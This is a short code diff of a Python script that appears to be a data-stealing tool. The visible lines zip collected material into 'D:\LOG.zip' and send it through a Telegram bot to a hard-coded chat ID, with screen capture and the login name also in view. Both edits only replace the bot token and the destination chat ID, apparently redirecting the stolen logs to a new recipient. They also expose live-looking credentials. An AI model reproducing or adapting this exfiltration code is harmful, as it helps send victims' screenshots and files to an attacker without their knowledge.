@@ -9,7 +9,7 @@ import zipfile
 from PIL import ImageGrab
 
 username = os.getlogin()
-token = '756172703:AAHyXD5Tii9J-JBl98-mAGGJxeTKKvSJG2s'
+token = '1890518768:AAEidn93bZoXoQOl6wJWawizl0iCZ4N3p2k'
 bot = telebot.TeleBot(token)
 
 ################################################################################
@@ -340,7 +340,7 @@ newzip.close()
 
 doc = 'D:\LOG.zip'
 
-bot.send_document(439184350, doc)
+bot.send_document(870305559, doc)
 
 
 
